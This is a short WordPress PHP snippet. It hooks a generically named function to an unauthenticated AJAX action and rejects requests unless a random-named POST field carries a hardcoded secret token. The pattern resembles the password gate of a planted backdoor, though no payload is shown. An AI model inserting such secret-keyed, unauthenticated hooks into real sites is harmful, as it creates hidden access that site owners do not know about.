<?php

function panel_dashboard_new() {
	if (!isset($_POST["tbppuzhptuzaxkj"]) || $_POST["tbppuzhptuzaxkj"] !== "x3tf23uJnep") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'panel_dashboard_new', 5, 1);
